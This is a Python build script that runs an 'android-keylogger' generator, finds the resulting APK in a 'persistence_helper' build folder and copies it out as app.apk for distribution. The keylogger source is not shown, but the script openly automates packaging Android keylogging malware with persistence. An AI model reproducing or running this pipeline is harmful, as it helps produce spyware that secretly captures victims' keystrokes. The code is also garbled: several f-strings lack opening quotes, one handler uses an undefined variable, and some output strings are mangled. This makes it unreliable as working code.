#!/usr/bin/env python3

import os
import subprocess
import shutil

def main():
    print("[*] Starting build automation...")

    # 1. Look for keylogger.py in android-keylogger/ directory
    script_path = os.path.join("android-keylogger", "keylogger.py")
    if not os.path.exists(script_path):
        print(f[!] Error: {script_path} not found.")
        return

    # 2. Run: python android-keylogger/keylogger.py
    print(f[*] Running {script_path}...")
    try:
        subprocess.run(["python", script_path], check=True)
    except subprocess.CalledProcessError as e:
        print(f[!] Error executing {script_path}: {e}")
        return
    except FileNotFoundError:
        print("[!] Error: 'python' command not found. Make sure it's in your PATH.")
        return

    # 3. Look for the output APK in android-keylogger/persistence_helper/app/build/outputs/apk/debug/
    apk_dir = os.path.join("android-keylogger", "persistence_helper", "app", "build", "outputs", "apk", "debug")
    apk_path = None

    if os.path.exists(apk_dir):
        for file in os.listdir(apk_dir):
            if file.endswith(".apk"):
                apk_path = os.path.join(apk_dir, file)
                break

    if not apk_path:
        print(f[!] Error: No APK found in {apk_dir}")
        return

    print(f[*] Found APK: {apk_path}")

    # 4. Copy the APK to ./output/app.apk
    output_dir = "output"
    output_apk_path = os.path.join(output_dir, "app.apk")

    if not os.path.exists(output_dir):
        os.makedirs(output_dir)

    try:
        shutil.copy2(apk_path, output_apk_path)
        print(f[*] Copied APK to { output_apk_path }")
    except Exception as e:
        print(f[!z] Error copying APK: {t}")
        return

    # 5. Create a simple text report saying "Build completed: app.apk"
    report_path = os.path.join(output_dir, "report.txt")
    try:
        with open(report_path, "w") as f:
            f.write("Build completed: app.apk\n")
        print(f[*] Created report at {report_path}")
    except Exception as e:
        print(f"[!] Error creating report: {e}")

    print("[+ All done, Jack.")

if __name__ == "__main__":
    main()